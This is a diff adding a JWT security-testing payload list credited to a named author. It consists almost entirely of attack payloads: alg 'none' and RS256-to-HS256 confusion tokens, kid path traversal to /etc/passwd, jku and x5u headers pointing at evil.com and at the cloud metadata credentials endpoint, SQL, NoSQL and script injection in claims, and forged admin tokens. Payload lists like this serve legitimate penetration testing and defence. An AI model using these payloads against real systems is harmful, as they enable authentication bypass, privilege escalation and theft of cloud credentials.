@@ -1,0 +1,155 @@
+# Enhanced JWT Security Testing Payloads
+# Author: Abdulrahman Muhammad (0xLegacy)
+# Contains payloads for JWT manipulation, token tampering, and common attacks
+
+# JWT Header Manipulation (Algorithm Confusion)
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+{"alg":"none","kid":"1","typ":"JWT"}
+{"alg":"HS256","typ":"JWT"}
+{"alg":"HS384","typ":"JWT"}
+{"alg":"HS512","typ":"JWT"}
+{"alg":"RS256","typ":"JWT"}
+{"alg":"RS384","typ":"JWT"}
+{"alg":"RS512","typ":"JWT"}
+{"alg":"ES256","typ":"JWT"}
+{"alg":"ES384","typ":"JWT"}
+{"alg":"ES512","typ":"JWT"}
+{"alg":"PS256","typ":"JWT"}
+{"alg":"PS384","typ":"JWT"}
+{"alg":"PS512","typ":"JWT"}
+{"alg":"HS256","kid":"1","typ":"JWT"}
+{"alg":"HS256","kid":"../../../dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"file:///dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"file://localhost/etc/passwd","typ":"JWT"}
+{"alg":"HS256","kid":"file://","typ":"JWT"}
+{"alg":"HS256","kid":"mysql://","typ":"JWT"}
+{"alg":"HS256","kid":"zlib:","typ":"JWT"}
+{"alg":"HS256","kid":"data://text/plain;base64,YWRtaW4=","typ":"JWT"}
+{"alg":"HS256","kid":"","typ":"JWT"}
+{"alg":"HS256","kid":null,"typ":"JWT"}
+{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"../../../../../../../../etc/passwd","typ":"JWT"}
+{"alg":"HS256","kid":"http://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","kid":"https://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","kid":"./jwks.json","typ":"JWT"}
+{"alg":"HS256","kid":"1","x5u":"http://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","jku":"http://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","x5u":"https://evil.com/.well-known/jwks.json","typ":"JWT"}
+{"alg":"HS256","jku":"https://evil.com/.well-known/jwks.json","typ":"JWT"}
+{"alg":"HS256","x5c":["MIIC+..."],"typ":"JWT"}
+{"alg":"RS256","x5u":"http://127.0.0.1:8000/jwks.json","typ":"JWT"}
+{"alg":"HS256","cty":"JWKS+json","typ":"JWT"}
+{"alg":"HS256","x5c":"YWFhYQ==","typ":"JWT"}
+{"alg":"RS256","n":"","e":"","typ":"JWT"}
+{"alg":"HS256","jwk":{"kty":"oct","k":"dGVzdA=="},"typ":"JWT"}
+{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","use":"sig","kid":"jwt-key","n":"abc123"},"typ":"JWT"}
+{"alg":"EdDSA","typ":"JWT"}
+{"alg":"RS256","typ":"JOSE"}
+{"alg":"RS256","typ":"JOSE+JSON"}
+{"alg":"RS256","crit":["exp"],"typ":"JWT"}
+{"alg":"RS256","crit":["kid"],"typ":"JWT"}
+{"alg":"RS256","crit":["alg","jku"],"typ":"JWT"}
+{"alg":"RS256","iss":"https://trusted-issuer.com","typ":"JWT"}
+
+# Algorithm Confusion - None to HS256
+{"alg":"none","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":true}.
+{"alg":"HS256","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":true}.
+
+# Algorithm Confusion - RS256 to HS256 (using public key as secret)
+{"alg":"RS256","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":false}.
+{"alg":"HS256","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":true}.
+
+# JWT Payload Manipulation
+{"sub":"1234567890","name":"John Doe","admin":false}
+{"sub":"1234567890","name":"John Doe","admin":true}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"admin":false}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":9999999999,"admin":true}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"role":"user"}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"role":"admin"}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"scope":"read"}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"scope":"read write admin"}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"permissions":["read"]}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"permissions":["read","write","admin"]}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"roles":["user"]}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222,"roles":["user","admin"]}
+{"sub":"admin","name":"Administrator","admin":true}
+{"sub":"1234567890","name":"John Doe","email":"admin@example.com"}
+{"sub":"1234567890","name":"John Doe","email":"john@example.com","email_verified":false}
+{"sub":"1234567890","name":"John Doe","email":"john@example.com","email_verified":true}
+{"sub":"1234567890","name":"John Doe","iss":"https://trusted-issuer.com"}
+{"sub":"1234567890","name":"John Doe","iss":"https://evil-issuer.com"}
+{"sub":"1234567890","name":"John Doe","aud":"https://api.example.com"}
+{"sub":"1234567890","name":"John Doe","aud":"https://evil.com"}
+{"sub":"1234567890","name":"John Doe","nbf":9999999999}
+
+# Time-based claims manipulation
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":1516246222}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":9999999999}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":null}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":-1}
+{"sub":"1234567890","name":"John Doe","iat":-1516239022,"exp":1516246222}
+{"sub":"1234567890","name":"John Doe","iat":null,"exp":null}
+{"sub":"1234567890","name":"John Doe","nbf":9999999999,"exp":9999999999}
+{"sub":"1234567890","name":"John Doe","nbf":-1,"exp":9999999999}
+
+# Injection in JWT claims
+{"sub":"' OR 1=1 --","name":"John Doe","iat":1516239022,"exp":1516246222}
+{"sub":"admin' --","name":"John Doe","iat":1516239022,"exp":1516246222}
+{"sub":"admin","name":"John Doe<script>alert(1)</script>","iat":1516239022,"exp":1516246222}
+{"sub":"1234567890","name":"John Doe","user_id":{"$gt":""}}
+{"sub":"1234567890","name":"John Doe","user_id":{"$ne":null}}
+{"sub":"1234567890","name":"John Doe","iat":1516239022,"exp":"1516246222' OR '1'='1"}
+{"sub":"1234567890","name":"John Doe","role": {"$ne": "user"}}
+{"sub":"1234567890","name":"John Doe || 1==1","iat":1516239022,"exp":1516246222}
+
+# JWT sensitive information disclosure
+{"sub":"1234567890","name":"John Doe","password":"secret123"}
+{"sub":"1234567890","name":"John Doe","api_key":"abcdef123456"}
+{"sub":"1234567890","name":"John Doe","secret":"api_key_here"}
+{"sub":"1234567890","name":"John Doe","private_key":"-----BEGIN PRIVATE KEY-----\nMIIEvwIBADA..."}
+{"sub":"1234567890","name":"John Doe","connection_string":"mongodb://admin:password@localhost:27017/database"}
+{"sub":"1234567890","name":"John Doe","aws_access_key":"AKIAIOSFODNN7EXAMPLE"}
+{"sub":"1234567890","name":"John Doe","aws_secret_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}
+
+# Kid (Key ID) Header Parameter Manipulation
+{"alg":"HS256","kid":"key1","typ":"JWT"}
+{"alg":"HS256","kid":"../../../dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"file:///dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"file://localhost/etc/passwd","typ":"JWT"}
+{"alg":"HS256","kid":"file://","typ":"JWT"}
+{"alg":"HS256","kid":"mysql://","typ":"JWT"}
+{"alg":"HS256","kid":"zlib:","typ":"JWT"}
+{"alg":"HS256","kid":"data://text/plain;base64,YWRtaW4=","typ":"JWT"}
+{"alg":"HS256","kid":"","typ":"JWT"}
+{"alg":"HS256","kid":null,"typ":"JWT"}
+{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"../../../../../../../../etc/passwd","typ":"JWT"}
+{"alg":"HS256","kid":"http://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","kid":"https://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","kid":"./jwks.json","typ":"JWT"}
+
+# JKU (JWK Set URL) Header Parameter Manipulation
+{"alg":"HS256","jku":"http://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","jku":"https://evil.com/.well-known/jwks.json","typ":"JWT"}
+{"alg":"HS256","jku":"file:///etc/passwd","typ":"JWT"}
+{"alg":"HS256","jku":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","typ":"JWT"}
+{"alg":"HS256","jku":"http://internal-service/jwks.json","typ":"JWT"}
+
+# X5U (X.509 URL) Header Parameter Manipulation
+{"alg":"HS256","x5u":"http://localhost:7070/jwks.json","typ":"JWT"}
+{"alg":"HS256","x5u":"https://evil.com/.well-known/jwks.json","typ":"JWT"}
+{"alg":"HS256","x5u":"file:///etc/passwd","typ":"JWT"}
+{"alg":"HS256","x5u":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","typ":"JWT"}
+{"alg":"HS256","x5u":"http://internal-service/x509.cer","typ":"JWT"}
+
+# Nested JWT attacks
+{"alg":"HS256","typ":"JWT","cty":"JWT"}
+
+# Combined attacks
+{"alg":"none","kid":"1","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":true}.
+{"alg":"HS256","kid":"../../../dev/null","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":true}.
+{"alg":"HS256","jku":"https://evil.com/.well-known/jwks.json","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":true}.
+{"alg":"RS256","x5u":"http://127.0.0.1:8000/jwks.json","typ":"JWT"}.{"sub":"1234567890","name":"John Doe","admin":true}.
